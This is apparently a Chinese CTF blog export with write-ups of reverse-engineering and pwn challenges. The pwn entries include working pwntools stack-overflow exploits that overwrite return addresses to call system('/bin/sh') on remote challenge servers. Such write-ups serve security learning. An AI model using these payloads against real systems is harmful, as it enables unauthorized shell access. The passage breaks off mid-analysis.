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</span><br></pre></td></tr></table></figure><p>原来这是图片数据，base64 png让我想到了经常看见但是没用过的base64转图片，转出来一个二维码，扫描后得到flag。</p><h1 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h1><p>用dex2jar和jd-gui操作一下得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (MainActivity.this.beg - MainActivity.this.now &lt;= 0)</span><br><span class="line">        &#123;</span><br><span class="line">          paramBundle.setText(&quot;The flag is:&quot;);</span><br><span class="line">          localTextView.setText(&quot;alictf&#123;&quot; + MainActivity.this.stringFromJNI2(MainActivity.this.k) + &quot;&#125;&quot;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以看到flag的格式啥的了，可是不会java有点看不懂，后面也有几题都是apk，等看了java再来看看。</p><h1 id="love"><a href="#love" class="headerlink" title="love"></a>love</h1><p>直接ida打开，搜索flag找到了关键函数。</p><p>要求输入flag，经过一个函数加密后，再每一位加上下标值，与一固定字符串对比。写脚本得出加上下标值之前的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">key=&apos;e3nifIH9b_C@n@dH&apos;</span><br><span class="line">temp=&apos;&apos;</span><br><span class="line">for i in range(len(key)):</span><br><span class="line">temp+=chr(ord(key[i])-i)</span><br><span class="line">print temp</span><br></pre></td></tr></table></figure><p>后发现加密函数就是base64加密，直接解密刚刚得到的temp字符串得到flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CGCTF-stackoverflow</title>
      <link href="/2018/10/03/cgctf-stackoverflow/"/>
      <url>/2018/10/03/cgctf-stackoverflow/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cgctf.nuptsast.com/challenges#Pwn" target="_blank" rel="noopener">题目地址</a></p><p>拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了</p><p>message函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+18h] [ebp-30h]</span><br><span class="line"></span><br><span class="line">n = 10;</span><br><span class="line">puts(&quot;you can leave some message here:&quot;);</span><br><span class="line">fgets(A, 60, stdin);</span><br><span class="line">puts(&quot;your name please:&quot;);</span><br><span class="line">fgets(&amp;s, n, stdin);</span><br><span class="line">return puts(&quot;Thank you&quot;);</span><br></pre></td></tr></table></figure><p>a可以用来存放/bin/sh字符串，n的地址就在a后面，而a的大小只有40，所以输入超过40的话就可以改变n的值，让s(大小为0x30)产生栈溢出，最终覆盖掉message函数的返回地址，进入system函数。</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&apos;182.254.217.142&apos;,10001)</span><br><span class="line">sh.recvuntil(&apos;your choice:&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;you can leave some message here:&apos;)</span><br><span class="line">payload=&apos;/bin/sh\0&apos;+&apos;a&apos;*40</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&apos;your name please:&apos;)</span><br><span class="line">payload=&apos;a&apos;*0x30+&apos;a&apos;*4+p32(0x80483f0)+&apos;a&apos;*4+p32(0x0804a080)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>随后按照题目提示进入目录cat flag即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>十一欢乐赛-pwn4</title>
      <link href="/2018/10/03/%E5%8D%81%E4%B8%80%E6%AC%A2%E4%B9%90%E8%B5%9B-pwn4/"/>
      <url>/2018/10/03/%E5%8D%81%E4%B8%80%E6%AC%A2%E4%B9%90%E8%B5%9B-pwn4/</url>
      
        <content type="html"><![CDATA[<p>有system函数 无/bin/sh字符串</p><p>首先要求输入账号密码，查找字符串，账号为admin，密码为T6OBSh2i,<br>之后进入menu函数，choice的输入有栈溢出，可以被利用，选择1之后可以对cmd字符串修改，给system提供参数/bin/sh。</p><p>因此大致就是首先输入账号密码，然后选择1，修改完system参数后返回menu函数，然后利用输入把menu的返回值覆盖为system函数的地址，最后选择3，退出menu函数，进入system函数，执行/bin/sh。</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10009)</span><br><span class="line">sh.recvuntil(&apos;username: &apos;)</span><br><span class="line">sh.sendline(&apos;admin&apos;)</span><br><span class="line">sh.recvuntil(&apos;password: &apos;)</span><br><span class="line">sh.sendline(&apos;T6OBSh2i&apos;)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x50+&apos;a&apos;*8+p64(0x40084a)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>随后cat flag即可得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>十一欢乐赛-bss_stack</title>
      <link href="/2018/10/03/%E5%8D%81%E4%B8%80%E6%AC%A2%E4%B9%90%E8%B5%9B-bss-stack/"/>
      <url>/2018/10/03/%E5%8D%81%E4%B8%80%E6%AC%A2%E4%B9%90%E8%B5%9B-bss-stack/</url>
      
        <content type="html"><![CDATA[<p>找了半天才找到在哪有栈溢出QAQ</p><p>是在输入完用户名再输入1之后，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+11h] [ebp-17h]</span><br><span class="line"></span><br><span class="line">printf(&quot;Enter password: &quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">fgets(&amp;s, 100, stdin);</span><br><span class="line">puts(&quot;Authentification failed&quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">return sleep(1u);</span><br></pre></td></tr></table></figure><p>fgets可以读入100个字符，s大小为0x17,所以输入超过0x17+4的话就可以覆盖返回地址。</p><p>这题是有system函数调用的，只是没有/bin/sh字符串，所以只需要找到system地址，再在username地址写入/bin/sh就行了，另外call system的时候会push一个返回地址，再往后才是参数command，因此要留出4个字节的offset脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10011)</span><br><span class="line">sh.recvuntil(&apos;User name : &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Action: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Enter password: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(0x08048500)+&apos;a&apos;*4+p32(0x08049dc8)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>之后cat flag就可以得到flag了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CGCTF-born</title>
      <link href="/2018/10/02/cgctf-born/"/>
      <url>/2018/10/02/cgctf-born/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cgctf.nuptsast.com/challenges#Pwn" target="_blank" rel="noopener">题目地址</a></p><p>看了欢乐赛里面的pwn题稍微了解了一些，但是再深入还是不会做，就想到先来cgctf把最简单的做了2333</p><p>打开test.c:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">struct Student &#123;</span><br><span class="line">    char name[8];</span><br><span class="line">    int birth;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">    setbuf(stdin, 0);</span><br><span class="line">    setbuf(stdout, 0);</span><br><span class="line">    setbuf(stderr, 0);</span><br><span class="line">    struct Student student;</span><br><span class="line">    printf(&quot;What\&apos;s Your Birth?\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;student.birth);</span><br><span class="line">    while (getchar() != &apos;\n&apos;) ;</span><br><span class="line">    if (student.birth == 1926) &#123;</span><br><span class="line">        printf(&quot;You Cannot Born In 1926!\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;What\&apos;s Your Name?\n&quot;);</span><br><span class="line">    gets(student.name);</span><br><span class="line">    printf(&quot;You Are Born In %d\n&quot;, student.birth);</span><br><span class="line">    if (student.birth == 1926) &#123;</span><br><span class="line">        printf(&quot;You Shall Have Flag.\n&quot;);</span><br><span class="line">        system(&quot;cat flag&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;You Are Naive.\n&quot;);</span><br><span class="line">        printf(&quot;You Speed One Second Here.\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现生日输入不能为1926（-1s），但是必须要birth=1926时才能cat flag，于是看到输入name时的gets函数是没有限制的，但是name是一个8字符大小的数组，所以可以通过输入超过8位的字符来覆盖掉birth使其等于1926，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote(&apos;ctf.acdxvfsvd.net&apos;,1926)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;*8 + p32(1926))</span><br><span class="line">sh.interactive</span><br></pre></td></tr></table></figure><p><strong><em>flag get</em></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>十一欢乐赛-reverse</title>
      <link href="/2018/10/02/%E5%8D%81%E4%B8%80%E6%AC%A2%E4%B9%90%E8%B5%9B-reverse/"/>
      <url>/2018/10/02/%E5%8D%81%E4%B8%80%E6%AC%A2%E4%B9%90%E8%B5%9B-reverse/</url>
      
        <content type="html"><![CDATA[<h1 id="HelloReverse"><a href="#HelloReverse" class="headerlink" title="HelloReverse"></a>HelloReverse</h1><p>直接拖进ida，发现一个名为getflag的函数，点进去发现plain里存着flag。</p><h1 id="HelloPython"><a href="#HelloPython" class="headerlink" title="HelloPython"></a>HelloPython</h1><p>pyc文件反编译一波直接运行，得不到flag分析一波程序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if len(sys.argv) &lt; 5:</span><br><span class="line">    print(&quot;I can&apos;t give you flag :(&quot;)</span><br><span class="line">    sys.exit(0)</span><br></pre></td></tr></table></figure><p>找到了一个判断条件，直接把exit(0)去掉</p><p>再把输入flag的判断条件改为1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if int(sys.argv[1]) &gt; 10 and Fibonacci(int(sys.argv[1])) == int(sys.argv[4]):</span><br><span class="line">    print(decrypt(15, &apos;MFKFMFMELFJEEHIFMDDGMGAGCGKGAFLHAGAFPHGHLHHGAGBGICMHAFIHAGNHODLGCH&apos;))</span><br></pre></td></tr></table></figure><p>运行发现<code>n = None // 2</code>会报错<br>改成<code>n=1</code>试试发现输出了一个S应该就是flag的开头</p><p>最后尝试出<code>n=33</code>时输出完整flag</p><h1 id="XOR1"><a href="#XOR1" class="headerlink" title="XOR1"></a>XOR1</h1><p>ida打开发现直接把两个数组异或就能得到flag</p><h1 id="XOR2"><a href="#XOR2" class="headerlink" title="XOR2"></a>XOR2</h1><p>和1差不多，区别是有一个数组是rand函数生成的，不过rand函数生成的随机数其实也是固定的。一开始用mac试了很久得不到flag，后来想起来不同系统随机数生成的也不一样，又用windows尝试，结果最后发现要用linux。</p><h1 id="Maze"><a href="#Maze" class="headerlink" title="Maze"></a>Maze</h1><p>写过了maze就很容易了，wasd对应上下左右移动<br>地图如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OOOO*OOOO</span><br><span class="line">O1111O11O</span><br><span class="line">O1OOOO1OO</span><br><span class="line">O11O111OO</span><br><span class="line">OO111OO1O</span><br><span class="line">OOO1OO11O</span><br><span class="line">OOO111O1O</span><br><span class="line">OOO1O1111</span><br><span class="line">OOOOOOOO1</span><br></pre></td></tr></table></figure><p>沿着1走到*得到flag 加上SUSCTF{}</p><hr><p>题目都很简单，其他方向的也都是当场百度就能做(pwn还没</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CGCTF-homuraVM</title>
      <link href="/2018/09/29/cgctf-homuraVM/"/>
      <url>/2018/09/29/cgctf-homuraVM/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cgctf.nuptsast.com/challenges#Re" target="_blank" rel="noopener">题目地址</a></p><p>ida打开F5主函数代码,要求输入一个字符串s</p><p>然后input[i+1]=s[i]<br>input[0]=s[len(s)-1]</p><p>之后把两个很长的字符串分别赋值到v39,v40</p><p>sub_8DC函数根据这两个字符串对input进行操作</p><p>sub_8AA不知道是干啥的，后百度得知是反调试</p><p>最后将处理过的input与给定的值对比，相同则ok</p><p>value1和value2初始值为0 i为很长的字符串的下标</p><p>读取到每个字符对应到的操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">case &quot;C&quot;:*value2-=2*(*value1&amp;*ipnut) ++i</span><br><span class="line">case &quot;G&quot;:--*value2                   ++i</span><br><span class="line">case &quot;M&quot;:*value2=*value1+*input      ++i</span><br><span class="line">case &quot;T&quot;:++*value2                   ++i</span><br><span class="line">case &quot;[&quot;:if *input!=0                ++i</span><br><span class="line">  else                       i为]后一位</span><br><span class="line">case &quot;]&quot;:if *input!=0                i为[后一位</span><br><span class="line">          else                       ++i</span><br><span class="line">case &quot;a&quot;:--*value1                   ++i</span><br><span class="line">case &quot;h&quot;:input=input+4               ++i</span><br><span class="line">case &quot;m&quot;:++*input                    ++i</span><br><span class="line">case &quot;o&quot;:input=input-4               ++i</span><br><span class="line">case &quot;r&quot;:++*value1                   ++i</span><br><span class="line">case &quot;u&quot;:--*input                    ++i</span><br><span class="line">case &quot;v&quot;:*value2=*value1             ++i</span><br><span class="line">case &quot;&#123;&quot;:if *value2!=0               ++i</span><br><span class="line">  else                       i为&#125;后一位</span><br><span class="line">case &quot;&#125;&quot;:if *value2!=0               i为&#123;后一位</span><br><span class="line">          else                       ++i</span><br></pre></td></tr></table></figure><p>注意到h是对input进行下标+1的操作，所以以h为分界线把很长的字符串分割开如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">h[ur]ovMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaaaMCh&#123;mG&#125; </span><br><span class="line">hv&#123;aG&#125;[ur]ovrrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrararaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrararrrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovararaaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrararraraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrrarrrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarrarrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaaarrarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrrarrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarrraaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovarraarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrraaarrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaaarrrrarrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrrraarrarrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaaraarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarrrarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrraarraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarrarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrraarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrrraaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrrrrrMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaaaarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrraaaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarraaMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarraraMCh&#123;mG&#125;</span><br><span class="line">hv&#123;aG&#125;[ur]ovaarrararMCh&#123;mG&#125;</span><br></pre></td></tr></table></figure><p>其中，每条都有的部分为hv{aG}[ur]ov……MCh{mG}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[ur]： *value1=*input    *input减到0 </span><br><span class="line">&#123;aG&#125;： *value1-=*value2  *value2减到0 </span><br><span class="line">&#123;mG&#125;： *input+=*value2   *value2减到0 </span><br><span class="line">hv&#123;aG&#125;[ur]ov……MCh&#123;mG&#125;:</span><br><span class="line">input+=4</span><br><span class="line">*value2=*value1</span><br><span class="line">*value1-=*value2</span><br><span class="line">*value2=0</span><br><span class="line">*value1=*input</span><br><span class="line">*input=0</span><br><span class="line">input-=4</span><br><span class="line">*value2=*value1</span><br><span class="line">.</span><br><span class="line">.                           此部分仅ar数量及顺序不同，控制*value1</span><br><span class="line">.</span><br><span class="line">*value2=*value1+*input</span><br><span class="line">*value2-=2*(*value1&amp;*ipnut)</span><br><span class="line">input+=4</span><br><span class="line">*input+=*value2</span><br><span 